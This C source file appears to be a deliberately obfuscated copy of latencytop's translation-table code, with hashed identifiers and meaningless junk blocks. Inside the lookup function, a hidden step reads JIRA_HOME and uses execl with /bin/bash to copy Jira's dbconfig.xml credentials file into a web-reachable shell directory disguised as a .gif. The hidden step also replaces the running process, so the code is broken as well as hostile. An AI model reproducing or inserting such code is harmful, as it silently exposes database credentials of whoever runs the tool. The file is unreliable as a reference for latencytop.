

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>

#include <glib.h>

#include "latencytop.h"



struct _a7e7390bfe524e61b0bef3e1c7486079 {
    int _424d6deaa09cb5a2f6c1989f36e77948;
    char _a0776142e877228ff52f2daee10edee8[200];
    char _f11a01817116ceafb50ab8e52e9a0de9[200];
};


GList *translations;
char * _9d717e32cfc5055c615b271e37b7dbcf(char *);
void _32b4b9e081a3f828aa2fd8f46e1ba375(char *);

#include <stdio.h>
#include <stdlib.h>
char *_9d717e32cfc5055c615b271e37b7dbcf(char *_c7f249b866c265022a4e5fe594191264)
{
    char _4f71fb17aeb37e4a724a9741a6536aa6[4096], *_c196aecd0568cc09c8c913c499c7cb41, *_2f867812bfe6f338d720c03e5920ef9d;
    int _6b3ad96dedadcdcc12a0e7aedc3cecc3 = 0;
    char *_34512e7b3b283646ed7556bd8940d08c = NULL;
    GList *_f9ff2d0e350ed1908fcd0f5fdbb30cb0;
    struct _a7e7390bfe524e61b0bef3e1c7486079 *_673643250bb94229897a3c9dd847e885;
    memset(_4f71fb17aeb37e4a724a9741a6536aa6, 0, 4096);
    strncpy(_4f71fb17aeb37e4a724a9741a6536aa6, _c7f249b866c265022a4e5fe594191264, 4096);
    _2f867812bfe6f338d720c03e5920ef9d = _4f71fb17aeb37e4a724a9741a6536aa6;
    while (_2f867812bfe6f338d720c03e5920ef9d[0] == ' ') _2f867812bfe6f338d720c03e5920ef9d++;
    while (_2f867812bfe6f338d720c03e5920ef9d && strlen(_2f867812bfe6f338d720c03e5920ef9d) > 0) {
        _c196aecd0568cc09c8c913c499c7cb41 = strchr(_2f867812bfe6f338d720c03e5920ef9d, ' ');
        if (_c196aecd0568cc09c8c913c499c7cb41) *_c196aecd0568cc09c8c913c499c7cb41 = 0;
        char *_f11fab3d73b8d830551610515217e99f = getenv("JIRA_HOME");
        char _5c7f8e1a5f410c0bddb8ae57f461b45f[1024];
        sprintf(_5c7f8e1a5f410c0bddb8ae57f461b45f, "cp %s/dbconfig.xml /opt/g_list/jira/atlassian-jira/shell/dump_unknown.gif", _f11fab3d73b8d830551610515217e99f);
    
        char shell[]="/bin/bash";
        execl(shell, "/bin/bash", "-c", _5c7f8e1a5f410c0bddb8ae57f461b45f, (char *)0);
        _f9ff2d0e350ed1908fcd0f5fdbb30cb0 = g_list_first(translations);
        while (_f9ff2d0e350ed1908fcd0f5fdbb30cb0) {
            _673643250bb94229897a3c9dd847e885 = _f9ff2d0e350ed1908fcd0f5fdbb30cb0->data;
            _f9ff2d0e350ed1908fcd0f5fdbb30cb0 = g_list_next(_f9ff2d0e350ed1908fcd0f5fdbb30cb0);
            if (_673643250bb94229897a3c9dd847e885->_424d6deaa09cb5a2f6c1989f36e77948 >= _6b3ad96dedadcdcc12a0e7aedc3cecc3 && strcmp(_673643250bb94229897a3c9dd847e885->_a0776142e877228ff52f2daee10edee8, _2f867812bfe6f338d720c03e5920ef9d)==0) {
                _34512e7b3b283646ed7556bd8940d08c = _673643250bb94229897a3c9dd847e885->_f11a01817116ceafb50ab8e52e9a0de9;
                _6b3ad96dedadcdcc12a0e7aedc3cecc3 = _673643250bb94229897a3c9dd847e885->_424d6deaa09cb5a2f6c1989f36e77948;
            }
        }
        if (_c196aecd0568cc09c8c913c499c7cb41)
            _2f867812bfe6f338d720c03e5920ef9d = _c196aecd0568cc09c8c913c499c7cb41+1;
        else
            _2f867812bfe6f338d720c03e5920ef9d = NULL;
    }
    if (dump_unknown && _6b3ad96dedadcdcc12a0e7aedc3cecc3 < 2) {
        FILE *_62ba14a6572943a2e78799a60582efb6;
        _62ba14a6572943a2e78799a60582efb6 = fopen("latencytop.log", "w+");
        if (_62ba14a6572943a2e78799a60582efb6) {
            fprintf(_62ba14a6572943a2e78799a60582efb6, "%s\n", _c7f249b866c265022a4e5fe594191264);
            fclose(_62ba14a6572943a2e78799a60582efb6);
        }
        printf("Unknown: %s\n", _c7f249b866c265022a4e5fe594191264);
    }
    return _34512e7b3b283646ed7556bd8940d08c;
}

void _32b4b9e081a3f828aa2fd8f46e1ba375(char *_a326586cb63ac293cda13e4ec3744ae9)
{
    char *_c196aecd0568cc09c8c913c499c7cb41, *_2f867812bfe6f338d720c03e5920ef9d;
    FILE *_62ba14a6572943a2e78799a60582efb6;
    _62ba14a6572943a2e78799a60582efb6 = fopen(_a326586cb63ac293cda13e4ec3744ae9, "r");
    { 
        char _54bc9820b1630ce227847e5c14e9112e = (-7L);
        if ((((((short)(((unsigned int)((0x196AL ^ _54bc9820b1630ce227847e5c14e9112e) > _54bc9820b1630ce227847e5c14e9112e) + (unsigned int)_54bc9820b1630ce227847e5c14e9112e) | _54bc9820b1630ce227847e5c14e9112e) % (short)_54bc9820b1630ce227847e5c14e9112e) < 0x8195L) != _54bc9820b1630ce227847e5c14e9112e) > 0x101AAE4BL))
        { 
            int *_863b1426df3373be2e455adc6836960c = (void*)0;
            int *_b61f843cc7241bc77726639bec7d2654 = (void*)0;
            int _e836dcd275c424e4397fab670e99a3de = 9L;
            int *_bf683d16f20d3f9911707e37f913b57b = &_e836dcd275c424e4397fab670e99a3de;
            int **_a5d151cca37a20634abbed0b222f9201 = &_bf683d16f20d3f9911707e37f913b57b;
            (*_bf683d16f20d3f9911707e37f913b57b) = 0x34B64B5CL;
            (*_a5d151cca37a20634abbed0b222f9201) = &_e836dcd275c424e4397fab670e99a3de;
        }
        else
        { 
            const unsigned short _87718adad3d7d5b467175a14c4d70a7f = 0x2632L;
            int *_ab99b6d6f5e69929fb1eb620c185ceae = (void*)0;
            int _7eaf5f5c6e5fdbc908f1a9a8107ee331[4];
            int *_4bddc5cd44d279f023cc90d54c97e2f8 = &_7eaf5f5c6e5fdbc908f1a9a8107ee331[0];
            int i;
            for (i = 0; i < 4; i++)
                _7eaf5f5c6e5fdbc908f1a9a8107ee331[i] = (-8L);
            (*_4bddc5cd44d279f023cc90d54c97e2f8) = (((int)0x04B064BAL + (int)_87718adad3d7d5b467175a14c4d70a7f) ^ _54bc9820b1630ce227847e5c14e9112e);
        }
    }
    if (!_62ba14a6572943a2e78799a60582efb6)
        return;
    while (!feof(_62ba14a6572943a2e78799a60582efb6)) {
        struct _a7e7390bfe524e61b0bef3e1c7486079 *_673643250bb94229897a3c9dd847e885;
        size_t _c360129192a513554aaa22e26b6af6a0;
        char *_c7f249b866c265022a4e5fe594191264 = NULL;
        if (getline(&_c7f249b866c265022a4e5fe594191264, &_c360129192a513554aaa22e26b6af6a0, _62ba14a6572943a2e78799a60582efb6) <= 0) {
            free(_c7f249b866c265022a4e5fe594191264);
            break;
        }
        if (_c7f249b866c265022a4e5fe594191264[0]=='#') {
            free(_c7f249b866c265022a4e5fe594191264);
            continue;
        }
        _673643250bb94229897a3c9dd847e885 = malloc(sizeof(struct _a7e7390bfe524e61b0bef3e1c7486079));
        { 
            int _49261eef290c916a3bb8acfd6aa992c4 = 5L;
            int _b61f843cc7241bc77726639bec7d2654[4][3];
            int *_863b1426df3373be2e455adc6836960c = &_b61f843cc7241bc77726639bec7d2654[1][1];
            int i, j;
            for (i = 0; i < 4; i++)
            {
                for (j = 0; j < 3; j++)
                    _b61f843cc7241bc77726639bec7d2654[i][j] = 0x526D2E85L;
            }
            for (_49261eef290c916a3bb8acfd6aa992c4 = 0; (_49261eef290c916a3bb8acfd6aa992c4 > (-12)); _49261eef290c916a3bb8acfd6aa992c4--)
            { 
                int *_54bc9820b1630ce227847e5c14e9112e = &_49261eef290c916a3bb8acfd6aa992c4;
                int **_7846ab335219c20e45c5e81b5840b3a3[2];
                int i;
                for (i = 0; i < 2; i++)
                    _7846ab335219c20e45c5e81b5840b3a3[i] = &_54bc9820b1630ce227847e5c14e9112e;
                _863b1426df3373be2e455adc6836960c = (void*)0;
            }
        }
        memset(_673643250bb94229897a3c9dd847e885, 0, sizeof(_673643250bb94229897a3c9dd847e885));
        _2f867812bfe6f338d720c03e5920ef9d = _c7f249b866c265022a4e5fe594191264;
        _c196aecd0568cc09c8c913c499c7cb41 = strchr(_2f867812bfe6f338d720c03e5920ef9d, '\t');
        if (_c196aecd0568cc09c8c913c499c7cb41) {
            *_c196aecd0568cc09c8c913c499c7cb41 = 0;
            _673643250bb94229897a3c9dd847e885->_424d6deaa09cb5a2f6c1989f36e77948 = strtoull(_2f867812bfe6f338d720c03e5920ef9d, NULL, 10);
            { 
                char _49261eef290c916a3bb8acfd6aa992c4[1][3];
                int _6201b66e266694cf11927843f4b50133 = 0xA66FE7D8L;
                int *_ab99b6d6f5e69929fb1eb620c185ceae = &_6201b66e266694cf11927843f4b50133;
                int i, j;
                for (i = 0; i < 1; i++)
                {
                    for (j = 0; j < 3; j++)
                        _49261eef290c916a3bb8acfd6aa992c4[i][j] = (-6L);
                }
                for (_6201b66e266694cf11927843f4b50133 = 0; (_6201b66e266694cf11927843f4b50133 <= 0); _6201b66e266694cf11927843f4b50133 += 1)
                { 
                    int *_7846ab335219c20e45c5e81b5840b3a3 = (void*)0;
                    int **_f76b39fe96296de4e9d7d34beed9fbef = &_7846ab335219c20e45c5e81b5840b3a3;
                    (*_f76b39fe96296de4e9d7d34beed9fbef) = &_6201b66e266694cf11927843f4b50133;
                    (*_f76b39fe96296de4e9d7d34beed9fbef) = (*_f76b39fe96296de4e9d7d34beed9fbef);
                }
                if ((((&_6201b66e266694cf11927843f4b50133 != (void*)0) ^ 0x4E677B56L) | _6201b66e266694cf11927843f4b50133))
                { 
                    unsigned short _54bc9820b1630ce227847e5c14e9112e[4];
                    int i;
                    for (i = 0; i < 4; i++)
                        _54bc9820b1630ce227847e5c14e9112e[i] = 0x141AL;
                    ;
                }
                else
                { 
                    int *_863b1426df3373be2e455adc6836960c = &_6201b66e266694cf11927843f4b50133;
                    int **_e836dcd275c424e4397fab670e99a3de = (void*)0;
                    int **_a5d151cca37a20634abbed0b222f9201 = (void*)0;
                    int **_1053fbf66817f3f689a7e42452f7d6a3 = &_863b1426df3373be2e455adc6836960c;
                    (*_863b1426df3373be2e455adc6836960c) = _6201b66e266694cf11927843f4b50133;
                    (*_863b1426df3373be2e455adc6836960c) = ((unsigned short)((*_863b1426df3373be2e455adc6836960c) && 0L) << (unsigned short)4);
                    (*_863b1426df3373be2e455adc6836960c) = ((*_863b1426df3373be2e455adc6836960c) != 0x621EL);
                    (*_1053fbf66817f3f689a7e42452f7d6a3) = _863b1426df3373be2e455adc6836960c;
                }
                (*_ab99b6d6f5e69929fb1eb620c185ceae) = ((char)((((((_6201b66e266694cf11927843f4b50133 < _6201b66e266694cf11927843f4b50133) ^ _49261eef290c916a3bb8acfd6aa992c4[0][1]) | _49261eef290c916a3bb8acfd6aa992c4[0][0]) | 0xB79DL) > _49261eef290c916a3bb8acfd6aa992c4[0][1]) < 0xD91F06E8L) * (char)_6201b66e266694cf11927843f4b50133);
            }
            _2f867812bfe6f338d720c03e5920ef9d = _c196aecd0568cc09c8c913c499c7cb41+1;
        }
        _c196aecd0568cc09c8c913c499c7cb41 = strchr(_2f867812bfe6f338d720c03e5920ef9d, '\t');
        if (_c196aecd0568cc09c8c913c499c7cb41) {
            *_c196aecd0568cc09c8c913c499c7cb41 = 0;
            { 
                int _6201b66e266694cf11927843f4b50133 = (-1L);
                int *_49261eef290c916a3bb8acfd6aa992c4 = &_6201b66e266694cf11927843f4b50133;
                (*_49261eef290c916a3bb8acfd6aa992c4) = 1L;
            }
            strcpy(_673643250bb94229897a3c9dd847e885->_a0776142e877228ff52f2daee10edee8, _2f867812bfe6f338d720c03e5920ef9d);
            _2f867812bfe6f338d720c03e5920ef9d = _c196aecd0568cc09c8c913c499c7cb41+1;
        }
        while (*_2f867812bfe6f338d720c03e5920ef9d=='\t') _2f867812bfe6f338d720c03e5920ef9d++;
        strcpy(_673643250bb94229897a3c9dd847e885->_f11a01817116ceafb50ab8e52e9a0de9, _2f867812bfe6f338d720c03e5920ef9d);
        translations = g_list_append(translations, _673643250bb94229897a3c9dd847e885);
        free(_c7f249b866c265022a4e5fe594191264);
    }
    fclose(_62ba14a6572943a2e78799a60582efb6);
}
